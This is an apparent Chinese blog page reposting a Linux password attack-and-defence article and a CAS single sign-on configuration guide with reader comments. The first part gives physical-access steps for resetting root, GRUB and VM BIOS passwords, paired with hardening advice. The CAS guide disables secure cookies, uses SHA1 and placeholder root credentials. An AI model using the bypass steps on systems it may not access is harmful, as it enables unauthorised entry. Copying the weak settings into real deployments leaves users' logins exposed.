<p>分享到： <a href="&quot;分享到QQ空间&quot;"></a><a href="&quot;分享到新浪微博&quot;"></a><a href="&quot;分享到腾讯微博&quot;"></a><a href="&quot;分享到人人网&quot;"></a><a href="&quot;分享到开心网&quot;"></a><a href="&quot;分享到豆瓣&quot;"></a><a href="&quot;分享到QQ书签&quot;"></a><a href="&quot;分享到Twitter&quot;"></a><a href="&quot;分享到鲜果&quot;"></a><a href="&quot;分享到Gmail邮箱&quot;"></a><a href=""></a><a href="&quot;分享到豆瓣9点&quot;"></a><a href="&quot;分享到邮件&quot;"></a><a href="&quot;加入收藏夹&quot;"></a><a href="&quot;复制网址&quot;"></a><a href="http://www.jiathis.com/share?uid=899792"></a><a href="">0</a>
<strong>摘要</strong>: 想写linux的相关文章很久了，身为一个运维出身的伪技术，我觉得linux是以后的趋势，所以linux的密码安全第一步要做好至关重要，本文对linux密码攻防作出说明，平台 Red Hat Linux （2.4.20-8） . 破解登录密码 GRUB:在引导装...
想写linux的相关文章很久了，身为一个运维出身的伪技术，我觉得linux是以后的趋势，所以linux的密码安全第一步要做好至关重要，本文对linux密码攻防作出说明，平台 Red Hat Linux （2.4.20-8） .</p>
<p>破解登录密码</p>
<p>GRUB:在引导装载程序菜单上，键入[e] 来进入编辑模式。你会面对一个引导项目列表。查找其中类似以下输出的句行： kernel /vmlinuz-2.4.18-0.4 ro root=/dev/hda2按箭头键直到这一行被突出显示，然后按 [e]。你现在可在文本结尾处空一格再添加 single 来告诉 GRUB 引导单用户 Linux 模式。按 [Enter] 键来使编辑结果生效。你会被带会编辑模式屏幕，从这里，按GRUB 就会引导单用户Linux 模式。结束载入后，你会面对一个与以下相似的shell 提示：sh-2.05/# 现在，你便可以改变根命令，键入：bash/# passwd root 你会被要求重新键入口令来校验。结束后，口令就会被改变，你便可以在提示下键入reboot 来重新引导；然后，象平常一样登录为根用户。LIL当系统启动到出现LILO引导画面时，对于图形引导方式按TAB键进入文本方式，然后在LILO处输入linux single回车即可进入免密码的控制台，进入以后使用passwd命令修改root的密码即可。</p>
<p>方法二：grub-&gt;linux-&gt;选中间一项—E—&gt;在提示符后输入 （/ linux s init 1）–回车–b–&gt;重启后，在提示符后输入（vi /etc/passwd 并将其中用户的密码传输位（x）去掉，强制保存）—-重启即可！</p>
<p>这是最常见也最快捷的方法</p>
<p>防止别人通过单用户模式修改密码。</p>
<p>由于想引导单用户模式需要在grub中进行编辑。因此，我们只要对grub进行加密，不让别人修改grub就可以防止了。</p>
<p>方法如下：</p>
<p>1.grub有一个配置文件，在/etc这个文件夹中。名称是“grub.conf”，找到这个文件，用vi编辑。</p>
<p>2.我们看下文件中的内容：（注释就免了）</p>
<p>default=0</p>
<p>timeout=10</p>
<p>splashimage=（hd0,0）/grub/splash.xpm.gz</p>
<p>title Red Hat Linux （2.4.20-8）</p>
<p>root （hd0,0）</p>
<p>kernel /vmlinuz-2.4.20-8 ro root=LABEL=/</p>
<p>initrd /initrd-2.4.20-8.img</p>
<p>具体含义大家可以查看下grub的相关文档，这里我们要加进密码。</p>
<p>共有两个地方可以添加密码。</p>
<p>3.第一处是“timeout=10”的下面，在这里加上“password=123456”（123456是自己的密码）。保存，退出，重启。我们可以看到，在grub的界面上已经不可以按“e”进行修改了。想修改必须按“p”输入密码后进行修改。</p>
<p>4.第二处是“initrd /initrd-2.4.20-8.img”的下面。在这里加上“password=123456”（123456是自己的密码）。保存，退出，重启。我们可以看到，linux启动前（过了grub界面）又多了一个密码。值得注意的是：这个密码是可以防止单用户模式进入的。也就是说，即使我们通过编辑grub启动单用户模式，还是要输入这个密码的。</p>
<p>如何破解grub密码，进而取得用户权限。</p>
<p>想要取得grub密码，我们就得想办法读取到grub.conf文件。但是没有grub密码，没有root密码……因此我们就不能通过grub引导。</p>
<p>方法如下：</p>
<p>1.首先要修改这个虚拟机的启动方式，我们需要从光盘启动。而虚拟机默认是硬盘为第一启动方式。</p>
<p>在虚拟机刚启动的时候（那个大大的“vmware”的界面）马上按“F2”进入bios。</p>
<p>2.选择到boot那一栏。选中“CD-ROM Drive”一项，按“+”把“CD-ROM Drive”这一项提升到最上面。这样系统就默认光盘启动为第一启动方式了。</p>
<p>3.把linux的第一张安装盘镜像绑定光驱后，保存，重启。系统会直接进入linux的安装界面。在提示符下输入“linux rescue”回车，系统将启动linux救援模式。</p>
<p>4.途中会有几个选项，按照提示选择就好。最后会看到一个说明，大概是说这个救援系统把原来的系统文件（硬盘上的那个）挂载到了“/mnt/sysimage”文件夹下。</p>
<p>5.启动好后，我们就可以寻找grub.conf文件了。这里要注意下文件夹的结构：我们现在在救援系统的根目录下。而我们要找的是原系统的“/etc/grub.conf”，因此完整的路径是：“/mnt/sysimage/etc/grub.conf”。用vi编辑此文件，我们便可以看到，并且修改该文件。从而破解掉grub密码。</p>
<p>防止别人引导到linux救援模式。</p>
<p>我们可以看到，要引导到救援模式必须修改bios。那么我们就可以通过对bios加密来达到防止别人修改bios，从而无法从光盘引导的目的。</p>
<p>方法如下：</p>
<p>这个比较简单。进入bios后选择“Security”项。在“Set Supervisor Password”上回车。设置密码就可以了。这样。我们重新启动系统再次进入bios的时候就需要密码了。</p>
<p>如何破解bios密码。</p>
<p>我们平时清除主机bios密码的时候经常用什么方法呢？拔跳线，抠电池，让bios恢复出厂设置。那么，在虚拟机上有类似的方法么？</p>
<p>方法如下：</p>
<p>找到虚拟机所在的文件夹，里面应该有一个后缀名是“。nvram”的文件。把这个文件删掉。启动系统。我们可以看到。bios被重置了。</p>
<p>原文地址：<a href="http://www.anying.org/thread-3710-1-1.html" target="_blank">http://www.anying.org/thread-3710-1-1.html</a>
来源： &lt;<a href="http://www.youxia.org/linux-password-crack/" target="_blank">Linux密码终极破解之战 - 游侠安全网</a>&gt; </p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/X/">X</a></li></span></span> | <span class="tags">Tagged <a href="/tags/X/" class="label label-primary">X</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-X--Linux密码终极破解之战/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-X--Linux密码终极破解之战" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-CAS--cas配置全攻略-哈哈-吼吼-这是个好地方-BlogJava/">cas配置全攻略 </a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-CAS--cas配置全攻略-哈哈-吼吼-这是个好地方-BlogJava/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="cas-blogjava">cas配置全攻略 - 哈哈,吼吼,这是个好地方 - BlogJava</h1>
<p><a href="http://www.blogjava.net/tufanshu/" target="_blank">哈哈,吼吼,这是个好地方</a>
没有风雨躲的过， 没有坎坷不必走……</p>
<p><a href="http://www.blogjava.net/" target="_blank">BlogJava</a>    <a href="http://www.blogjava.net/tufanshu/" target="_blank">首页</a>    <a href="http://www.blogjava.net/tufanshu/admin/EditPosts.aspx?opt=1" target="_blank">新随笔</a>    <a href="http://www.blogjava.net/tufanshu/contact.aspx?id=1" target="_blank">联系</a>    <a href="http://www.blogjava.net/tufanshu/rss" target="_blank">聚合</a><a href="http://www.blogjava.net/tufanshu/rss" target="_blank"><img src="" alt=""></a>    <a href="http://www.blogjava.net/tufanshu/admin/EditPosts.aspx" target="_blank">管理</a></p>
<p>posts - 37,  comments - 50,  trackbacks - 0</p>
<p><a href="">cas配置全攻略</a></p>
<p>经过将近两天的测试，参考众多网友的贡献，终于完成了对cas的主要配置和测试，现记录如下</p>
<p>基本需求：</p>
<p>1.cas server-3.4.5,casclient-3.2（官方版本），均可在cas官方网站下载，<a href="http://www.jasig.org/" target="_blank"><a href="http://www.jasig.org">http://www.jasig.org</a></a></p>
<p>2.使用低成本的http协议进行传输，俺买不起ssl证书</p>
<p>3.通过jdbc进行用户验证</p>
<p>4.需要通过casserver提供除登录用户名以外的附加信息</p>
<p>参考资料：</p>
<p>1.cas官方网站的用户帮助手册和wiki</p>
<p>2.网友“城市猎人”的blog，<a href="http://yuzhwe.javaeye.com/blog/830143" target="_blank"><a href="http://yuzhwe.javaeye.com/blog/830143">http://yuzhwe.javaeye.com/blog/830143</a></a></p>
<p>3.网友“悟空悟道”的blog，<a href="http://llhdf.javaeye.com/blog/764385" target="_blank"><a href="http://llhdf.javaeye.com/blog/764385">http://llhdf.javaeye.com/blog/764385</a></a></p>
<p>4.其他网友贡献的相关的blog，都是通过google出来，就不一一列出了，一并致谢！！！</p>
<p>好了，下面进入正题，如果您不想测试中出现异常情况，或是获取不到相关数据，请关注文中的红色字体部分。</p>
<p>（1）使用http协议的设置，如果您也像我一样，买不起ssl数字证书，对安全的要求也不是特别的搞，下面的配置就可以帮助解决这个问题：</p>
<p>在cas-server-webapp中的/WEB-INF/spring-configuration/ticketGrantingTicketCookieGenerator.xml文件中有如下配置</p>
<bean id="ticketGrantingTicketCookieGenerator" class="org.jasig.cas.web.support.CookieRetrievingCookieGenerator"
  p:cookieSecure="true"     //默认为true，使用https,如果只需要http，修改为false即可
  p:cookieMaxAge="-1"
  p:cookieName="CASTGC"
  p:cookiePath="/cas" />

 （2）使用jdbc数据源进行用户认证，需要修改cas的authenticationHandlers方式，在文件/WEB-INF/deployerConfigContext.xml有如下配置：

<property name="authenticationHandlers">
   <list>
    <!--
     | This is the authentication handler that authenticates services by means of callback via SSL, thereby validating
     | a server side SSL certificate.
     +-->
    <bean class="org.jasig.cas.authentication.handler.support.HttpBasedServiceCredentialsAuthenticationHandler"
     p:httpClient-ref="httpClient" />
    <!--
     | This is the authentication handler declaration that every CAS deployer will need to change before deploying CAS
     | into production.  The default SimpleTestUsernamePasswordAuthenticationHandler authenticates UsernamePasswordCredentials
     | where the username equals the password.  You will need to replace this with an AuthenticationHandler that implements your
     | local authentication strategy.  You might accomplish this by coding a new such handler and declaring
     | edu.someschool.its.cas.MySpecialHandler here, or you might use one of the handlers provided in the adaptors modules.
     +-->
    <!--<bean class="org.jasig.cas.authentication.handler.support.SimpleTestUsernamePasswordAuthenticationHandler" />-->
     <bean  class="org.jasig.cas.adaptors.jdbc.QueryDatabaseAuthenticationHandler">
         <property name="dataSource" ref="dataSource" />
        <property name="sql" value="select password from userInfo where username=? and enabled=true" />
         //用户密码编码方式
         <property name="passwordEncoder"
           ref="passwordEncoderBean"/>
         </bean><br>   </list>
  </property>

该属性中的list只要用一个认证通过即可，建议将红色部分放在第一位，如果确认只用jdbc一种方式，其他认证方式均可删除。另外需要在在文件中添加datasoure和passordEncoder两个bean，如下

<!-- Data source definition -->
 <bean id="dataSource" class="org.springframework.jdbc.datasource.DriverManagerDataSource">
  <property name="driverClassName">
    <value>com.mysql.jdbc.Driver</value>
  </property>
  <property name="url">
    <value>jdbc:mysql://localhost:3306/test?useUnicode=true&amp;characterEncoding=utf-8</value>    //如果使用mysql数据库，应该加上后面的编码参数，否则可能导致客户端对TGT票据无法识别的问题
  </property>
  <property name="username"><value>root</value></property>
  <property name="password"><value>password</value></property>
 </bean>
 <bean id="passwordEncoderBean" class="org.jasig.cas.authentication.handler.DefaultPasswordEncoder">
        <constructor-arg value="SHA1" />  //cas
server默认支持MD5和SHA1两种编码方式，如果需要其他的编码方式例如SHA256,512等，可自行实现org.jasig.cas.authentication.handler.PasswordEncoder接口
    </bean>

<p>附加备注：如果您是使用cas server的源码自行编译的话，需要在cas-server-web模块的pom.xml中添加如下模块的依赖：</p>
<dependency>
       <groupId>${project.groupId}</groupId>
       <artifactId>cas-server-support-jdbc</artifactId>
       <version>${project.version}</version>
  </dependency>  

<p>并添加对应数据库的jdbc的jar包。</p>
<p>（3）让cas server提供更多的用户数据共客户端使用</p>
<p>通过测试，由于cas的代码更新过程中的变化较大，所以包兼容的问题好像一直存在，在测试中我就碰到过，花费时间比较多，建议同学们在使用过程中使用官方的最新的发布版本。在我使用的这个版本中，请参考前面的关于server和client端的版本说明，应该没有包冲突的问题，测试通过。下面进行配置，配置文件：/WEB-INF/deployerConfigContext.xml</p>
<p><property name="credentialsToPrincipalResolvers">
   <list>
       <!--<bean class="org.jasig.cas.authentication.principal.UsernamePasswordCredentialsToPrincipalResolver" />-->
    <!-- modify on 2011-01-18,add user info -->
    <bean class="org.jasig.cas.authentication.principal.UsernamePasswordCredentialsToPrincipalResolver" >
      <property name="attributeRepository" >   //为认证过的用户的Principal添加属性
      <ref local="attributeRepository"/>
     </property> 
    </bean>
      <bean
     class="org.jasig.cas.authentication.principal.HttpBasedServiceCredentialsToPrincipalResolver" />
   </list>
  </property>
 修改该文件中默认的 attributeRepositorybean配置
<!-- 在这里配置获取更多用户的信息 -->
 <bean id="attributeRepository" class="org.jasig.services.persondir.support.jdbc.SingleRowJdbcPersonAttributeDao">
  <constructor-arg index="0" ref="dataSource" />
  <constructor-arg index="1" value="select id as UId, password_hint as ph from userInfo where username=? and enabled=true" />
  <property name="queryAttributeMapping">
   <map>
   <entry key="username" value="uid"/><!-- 这里必须这么写，系统会自己匹配，貌似和where语句后面的用户名字段的拼写没有什么关系 -->
   </map>
  </property>
   <!-- 要获取的属性在这里配置 -->
  <property name="resultAttributeMapping">
   <map>
   <entry key="UId" value="userId" /> //key为对应的数据库字段名称，value为提供给客户端获取的属性名字，系统会自动填充值
   <entry key="ph" value="passwordHint" /><br>   </map>
  </property>
</bean> 
备注：网上有很多的关于这个的配置，但是如果您使用的是我提供的版本或是高于这个版本，就应该象上面这样配置，无用质疑，网上大部分的配置都是基于
person-directory-impl,person-directory-api
1.1左右的版本，而最新的cas使用的是1.5的版本，经过查看源代码和api docs确定最新版本的属性参数如上配置。</p>
<p>修改该xml文件中最后一个默认的serviceRegistryDao bean中的属性全部注释掉，或者删除，
这个bean中的RegisteredServiceImpl的ignoreAttributes属性将决定是否添加attributes属性内容，默认为false:不添加，只有去掉这个配置，
cas server才会将获取的用户的附加属性添加到认证用的Principal的attributes中去，我在这里犯过这样的错误，最后还是通过跟踪源码才发现的。</p>
<bean
  id="serviceRegistryDao"
        class="org.jasig.cas.services.InMemoryServiceRegistryDaoImpl">
        &lt;!--
            <property name="registeredServices">
                <list>
                    <bean class="org.jasig.cas.services.RegisteredServiceImpl">
                        <property name="id" value="0" />
                        <property name="name" value="HTTP" />
                        <property name="description" value="Only Allows HTTP Urls" />
                        <property name="serviceId" value="http:///*/*" />
                    </bean>

<pre><code>                &lt;bean class=&quot;org.jasig.cas.services.RegisteredServiceImpl&quot;&gt;
                    &lt;property name=&quot;id&quot; value=&quot;1&quot; /&gt;
                    &lt;property name=&quot;name&quot; value=&quot;HTTPS&quot; /&gt;
                    &lt;property name=&quot;description&quot; value=&quot;Only Allows HTTPS Urls&quot; /&gt;
                    &lt;property name=&quot;serviceId&quot; value=&quot;https:///*/*&quot; /&gt;
                &lt;/bean&gt;

                &lt;bean class=&quot;org.jasig.cas.services.RegisteredServiceImpl&quot;&gt;
                    &lt;property name=&quot;id&quot; value=&quot;2&quot; /&gt;
                    &lt;property name=&quot;name&quot; value=&quot;IMAPS&quot; /&gt;
                    &lt;property name=&quot;description&quot; value=&quot;Only Allows HTTPS Urls&quot; /&gt;
                    &lt;property name=&quot;serviceId&quot; value=&quot;imaps:///*/*&quot; /&gt;
                &lt;/bean&gt;

                &lt;bean class=&quot;org.jasig.cas.services.RegisteredServiceImpl&quot;&gt;
                    &lt;property name=&quot;id&quot; value=&quot;3&quot; /&gt;
                    &lt;property name=&quot;name&quot; value=&quot;IMAP&quot; /&gt;
                    &lt;property name=&quot;description&quot; value=&quot;Only Allows IMAP Urls&quot; /&gt;
                    &lt;property name=&quot;serviceId&quot; value=&quot;imap:///*/*&quot; /&gt;
                &lt;/bean&gt;
            &lt;/list&gt;
        &lt;/property&gt;--&gt;
       &lt;/bean&gt;
</code></pre><p> 修改WEB-INF\view\jsp\protocol\2.0\casServiceValidationSuccess.jsp文件，如下：</p>
<p>&lt;%@ page session=&quot;false&quot;%&gt;
&lt;%@ taglib prefix=&quot;c&quot; uri=&quot;<a href="http://java.sun.com/jsp/jstl/core%22%" target="_blank"><a href="http://java.sun.com/jsp/jstl/core&quot;%">http://java.sun.com/jsp/jstl/core&quot;%</a></a>&gt;
&lt;%@ taglib uri=&quot;<a href="http://java.sun.com/jsp/jstl/functions" target="_blank"><a href="http://java.sun.com/jsp/jstl/functions">http://java.sun.com/jsp/jstl/functions</a></a>&quot; prefix=&quot;fn&quot;%&gt;</p>
<p><cas:serviceResponse xmlns:cas='http://www.yale.edu/tp/cas'>
 <cas:authenticationSuccess>
  <cas:user>${fn:escapeXml(assertion.chainedAuthentications[fn:length(assertion.chainedAuthentications)-1].principal.id)}</cas:user>
  <c:if test="${not empty pgtIou}">
   <cas:proxyGrantingTicket>${pgtIou}</cas:proxyGrantingTicket>
  </c:if>
  <c:if test="${fn:length(assertion.chainedAuthentications) > 1}">
   <cas:proxies>
    <c:forEach var="proxy" items="${assertion.chainedAuthentications}"
     varStatus="loopStatus" begin="0"
     end="${fn:length(assertion.chainedAuthentications)-2}" step="1">
     <cas:proxy>${fn:escapeXml(proxy.principal.id)}</cas:proxy>
    </c:forEach>
   </cas:proxies>
  </c:if>
   <c:if
   test="${fn:length(assertion.chainedAuthentications[fn:length(assertion.chainedAuthentications)-1].principal.attributes)
>
0}">
   <cas:attributes>
    <c:forEach
var="attr"
     items="${assertion.chainedAuthentications[fn:length(assertion.chainedAuthentications)-1].principal.attributes}"
     varStatus="loopStatus"
begin="0"
     end="${fn:length(assertion.chainedAuthentications[fn:length(assertion.chainedAuthentications)-1].principal.attributes)-1}"
     step="1">
     <cas:${fn:escapeXml(attr.key)}>${fn:escapeXml(attr.value)}</cas:${fn:escapeXml(attr.key)}>
    </c:forEach>
   </cas:attributes>
  </c:if>
 </cas:authenticationSuccess>
</cas:serviceResponse>
客户端配置:
1.过滤器CAS Validation Filter：</p>
<p><filter>
  <filter-name>CAS Validation Filter</filter-name>
  <filter-class> org.jasig.cas.client.validation.Cas20ProxyReceivingTicketValidationFilter</filter-class>
  <init-param>
    <param-name>casServerUrlPrefix</param-name>
    <param-value><a href="http://domainserver:8081/cas" target="_blank">http://domainserver:8081/cas</a></param-value>
  </init-param>
</filter>
在客户端获取信息
AttributePrincipal principal = (AttributePrincipal) request.getUserPrincipal();
String loginName = principal.getName();//获取用户名
Map<String, Object> attributes = principal.getAttributes();
if(attributes != null) {
 System.out.println(attributes.get(&quot;userId&quot;));
 System.out.println(attributes.get(&quot;passwordHint&quot;));
}</p>
<p>posted on 2011-01-21 10:06 <a href="http://www.blogjava.net/tufanshu/" target="_blank">雪地孤鸿</a> 阅读(3704) <a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#Post" target="_blank">评论(7)</a>  <a href="http://www.blogjava.net/tufanshu/admin/EditPosts.aspx?postid=343290" target="_blank">编辑</a>  <a href="http://www.blogjava.net/tufanshu/AddToFavorite.aspx?id=343290" target="_blank">收藏</a> 所属分类: <a href="http://www.blogjava.net/tufanshu/category/4974.html" target="_blank">java</a> <img src="" alt=""></p>
<p><a href=""></a>
<strong>FeedBack:</strong></p>
<p><a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#343395" title="permalink: re: cas配置全攻略" target="_blank">/#</a> <a href=""></a>re: cas配置全攻略</p>
<p>2011-01-23 13:13 | <a href="">来如风</a>
非常好，我上周也配置成功
只是最后过滤器有疑问</p>
<p><init-param></p>
<p><param-name>casServerUrlPrefix</param-name></p>
<p><param-value><a href="http://domainserver:8081/cas%3C/param-value%3E" target="_blank"><a href="http://domainserver:8081/cas">http://domainserver:8081/cas</a></param-value></a>
</init-param>
我是集成了spring security 的配置，貌似这些不在过滤其中配置，在bean文件中有  <a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#post" target="_blank">回复</a>  <a href="http://www.blogjava.net/comment?author=%e6%9d%a5%e5%a6%82%e9%a3%8e" title="查看该作者发表过的评论" target="_blank">更多评论</a>
<a href=""></a>  <a href=""></a>
<a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#343442" title="permalink: re: cas配置全攻略" target="_blank">/#</a> <a href=""></a>re: cas配置全攻略</p>
<p>2011-01-24 16:29 | <a href="">coolszy</a>
你好，按照你的配置，但是
Map<String, Object> attributes = principal.getAttributes();
还是得到空值，不知道什么原因  <a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#post" target="_blank">回复</a>  <a href="http://www.blogjava.net/comment?author=coolszy" title="查看该作者发表过的评论" target="_blank">更多评论</a>
<a href=""></a>  <a href=""></a></p>
<p><a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#343924" title="permalink: re: cas配置全攻略[未登录]" target="_blank">/#</a> <a href=""></a>re: cas配置全攻略[未登录]</p>
<p>2011-02-07 11:02 | <a href="">mcikeay</a></p>
<p><entry key="username" value="uid"/><!-- 这里必须这么写，系统会自己匹配，貌似和where语句后面的用户名字段的拼写没有什么关系 -->
cas 会自己组装<map>节点中的key-value, 节点间默认是 and 连接  <a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#post" target="_blank">回复</a>  <a href="http://www.blogjava.net/comment?author=mcikeay" title="查看该作者发表过的评论" target="_blank">更多评论</a>
<a href=""></a>  <a href=""></a>
<a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#344268" title="permalink: re: cas配置全攻略" target="_blank">/#</a> <a href=""></a>re: cas配置全攻略</p>
<p>2011-02-14 15:15 | <a href="http://040922/" target="_blank">tufanshu</a>
@coolszy
请检查cas client的版本是否正确  <a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#post" target="_blank">回复</a>  <a href="http://www.blogjava.net/comment?author=tufanshu" title="查看该作者发表过的评论" target="_blank">更多评论</a>
<a href=""></a>  <a href=""></a></p>
<p><a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#347172" title="permalink: re: cas配置全攻略" target="_blank">/#</a> <a href=""></a>re: cas配置全攻略</p>
<p>2011-03-29 10:45 | <a href="">wuximin</a>
通过ldap验证，改怎样修改呢  <a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#post" target="_blank">回复</a>  <a href="http://www.blogjava.net/comment?author=wuximin" title="查看该作者发表过的评论" target="_blank">更多评论</a>
<a href=""></a>  <a href=""></a>
<a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#351783" title="permalink: re: cas配置全攻略" target="_blank">/#</a> <a href=""></a>re: cas配置全攻略</p>
<p>2011-06-05 18:19 | <a href="http://xn--rgv/" target="_blank">artd</a>
按您的要求，为何还是不行呀，不知道那里出问题了。
不过我用的server是3.3.5.1
用3.4.5也不行，有空交流一下哟。
以下是log信息
2011-06-05 18:09:19,515 DEBUG [org.jasig.cas.authentication.principal.UsernamePasswordCredentialsToPrincipalResolver] - Attempting to resolve a principal...
2011-06-05 18:09:19,515 DEBUG [org.jasig.cas.authentication.principal.UsernamePasswordCredentialsToPrincipalResolver] - Creating SimplePrincipal for [test]
2011-06-05 18:09:20,421 DEBUG [org.jasig.services.persondir.support.jdbc.SingleRowJdbcPersonAttributeDao] - Created seed map=&#39;{username=[test]}&#39; for uid=&#39;test&#39;
2011-06-05 18:09:20,421 DEBUG [org.jasig.services.persondir.support.jdbc.SingleRowJdbcPersonAttributeDao] - Adding attribute &#39;username&#39; with value &#39;[test]&#39; to query builder &#39;null&#39;
2011-06-05 18:09:20,421 DEBUG [org.jasig.services.persondir.support.jdbc.SingleRowJdbcPersonAttributeDao] - Generated query builder &#39;sql=[username = ?] args=[test]&#39; from query Map {username=[test]}.
2011-06-05 18:09:20,546 DEBUG [org.jasig.services.persondir.support.jdbc.SingleRowJdbcPersonAttributeDao] - Executed &#39;select id,username,password,email,score from user where username = ?&#39; with arguments [test] and got results [{id=20428, username=test, password=1a16128849444873, email=et@163.com, score=6}]
2011-06-05 18:09:20,562 INFO [org.jasig.cas.CentralAuthenticationServiceImpl] - Granted service ticket [ST-1-cp3cb14yiqbqnYfg7C1f-cas] for service [<a href="http://d7.abc.com/simple.php" target="_blank"><a href="http://d7.abc.com/simple.php">http://d7.abc.com/simple.php</a></a>] for user [test]
2011-06-05 18:09:20,640 DEBUG [org.springframework.web.servlet.view.RedirectView] - Rendering view with name &#39;null&#39; with model null and static attributes {}
2011-06-05 18:09:20,703 DEBUG [org.springframework.web.servlet.view.ResourceBundleViewResolver] - Cached view [casServiceSuccessView_zh_CN]
2011-06-05 18:09:20,703 DEBUG [org.springframework.web.servlet.view.JstlView] - Rendering view with name &#39;casServiceSuccessView&#39; with model {assertion=[principals={[[Principal=test, attributes={authenticationMethod=com.jute.framework.jdbc.QueryDatabaseAuthenticationHandler}]]} for service=<a href="http://d7.abc.com/simple.php" target="_blank"><a href="http://d7.abc.com/simple.php">http://d7.abc.com/simple.php</a></a>]} and static attributes {}
2011-06-05 18:09:20,750 DEBUG [org.springframework.web.servlet.view.JstlView] - Added model object &#39;assertion&#39; of type [org.jasig.cas.validation.ImmutableAssertionImpl] to request in view with name &#39;casServiceSuccessView&#39;
2011-06-05 18:09:20,750 DEBUG [org.springframework.web.servlet.view.JstlView] - Forwarding to resource [/WEB-INF/view/jsp/protocol/2.0/casServiceValidationSuccess.jsp] in InternalResourceView &#39;casServiceSuccessView&#39;
  <a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#post" target="_blank">回复</a>  <a href="http://www.blogjava.net/comment?author=artd" title="查看该作者发表过的评论" target="_blank">更多评论</a>
<a href=""></a>  <a href=""></a></p>
<p><a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#361580" title="permalink: re: cas配置全攻略" target="_blank">/#</a> <a href=""></a>re: cas配置全攻略<a href=""></a></p>
<p>2011-10-19 15:24 | <a href="">fanfree</a>
同样遇到 Map是空的，没有附加属性  <a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#post" target="_blank">回复</a>  <a href="http://www.blogjava.net/comment?author=fanfree" title="查看该作者发表过的评论" target="_blank">更多评论</a>
<a href=""></a>  <a href=""></a>
<a href="http://www.blogjava.net/RequireRegister.aspx" target="_blank">新用户注册</a>  <a href="">刷新评论列表</a>  </p>
<p><a href=""></a> <a href="http://q.cnblogs.com/">博问 - 解决您的IT难题</a>   <a href="http://www.cnblogs.com/" target="_blank">博客园</a>  <a href="http://q.cnblogs.com/" target="_blank">博问</a>  <a href="http://news.cnblogs.com/" target="_blank">IT新闻</a>  <a href="http://job.cnblogs.com/cate-java_programmer/" target="_blank">Java程序员招聘</a> 标题  请输入标题 姓名  请输入你的姓名 主页 请输入验证码 验证码 /*  <img src="" alt=""> 内容(请不要发表任何与政治相关的内容) 请输入评论内容 Remember Me?   <a href="http://www.blogjava.net/login.aspx?ReturnURL=http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html&amp;SourceURL=/tufanshu/archive/2011/01/21/343290.html" target="_blank">登录</a>       [使用Ctrl+Enter键可以直接提交]    IT新闻：
· <a href="http://news.cnblogs.com/n/149115/" target="_blank">苹果在移动支付领域之慢，是福是祸？</a>
· <a href="http://news.cnblogs.com/n/149114/" target="_blank">黑莓应用商店应用下载量突破30亿次，应用数量达9万款</a>
· <a href="http://news.cnblogs.com/n/149113/" target="_blank">微软将推出Bing天使基金孵化器</a>
· <a href="http://news.cnblogs.com/n/149112/" target="_blank">苹果在华测试iPad mini：微胖 具备通话功能</a>
· <a href="http://news.cnblogs.com/n/149111/" target="_blank">抱上微软粗腿不怕！诺基亚豪言明年定走出困境</a></p>
<p>博客园首页随笔：
· <a href="http://www.cnblogs.com/lzrabbit/archive/2012/07/09/2574491.html" target="_blank">MVC3使用Unity实现依赖注入接口与于实现类自动注册</a>
· <a href="http://www.cnblogs.com/stoic/archive/2012/07/09/2582212.html" target="_blank">k-means clustering K平均算法</a>
· <a href="http://www.cnblogs.com/izumu/archive/2012/07/09/2582200.html" target="_blank">【hdu - 1061 Rightmost Digit】</a>
· <a href="http://www.cnblogs.com/refactor/archive/2012/07/09/2575995.html" target="_blank">SqlServer 对 数据类型 text 的操作</a>
· <a href="http://www.cnblogs.com/stephen-liu74/archive/2012/07/09/2423565.html" target="_blank">Step By Step(Lua弱引用table)</a>
知识库：
· <a href="http://kb.cnblogs.com/page/143279/" target="_blank">页面前端的水有多深？再议页面开发</a>
· <a href="http://kb.cnblogs.com/page/130367/" target="_blank">Fiddler 教程</a>
· <a href="http://kb.cnblogs.com/page/148772/" target="_blank">关于编程学习的七点思索</a>
· <a href="http://kb.cnblogs.com/page/115175/" target="_blank">一地鸡毛 — 软件项目中的人际困局</a>
· <a href="http://kb.cnblogs.com/page/148841/" target="_blank">互联网——降级论</a>  网站导航:</p>
<p><a href="http://www.cnblogs.com/" title="程序员的网上家园" target="_blank">博客园</a>   <a href="http://news.cnblogs.com/" target="_blank">IT新闻</a>   <a href="http://kb.cnblogs.com/" target="_blank">知识库</a>   <a href="http://www.cppblog.com/" target="_blank">C++博客</a>   <a href="http://job.cnblogs.com/" target="_blank">程序员招聘</a>   <a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html?opt=admin" target="_blank">管理</a> 相关文章:</p>
